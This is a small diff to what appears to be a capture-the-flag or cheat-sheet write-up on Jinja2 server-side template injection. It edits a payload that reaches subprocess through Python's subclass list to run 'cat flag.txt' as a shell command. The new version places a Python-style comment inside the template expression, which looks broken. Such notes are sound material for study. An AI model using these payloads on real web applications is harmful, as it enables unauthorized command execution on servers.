@@ -31,5 +31,5 @@ python3 extract_subclass_num.py subclasses subprocess
 ```
 3. Running OS commands
 ```
-{{ [].__class__.__base__.__subclasses__()[414]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip() }}
+{{ [].__class__.__base__.__subclasses__()[414]('cat flag.txt',shell=True,stdout=-1).communicate() # returns (stdout, stderr) }}
 ```
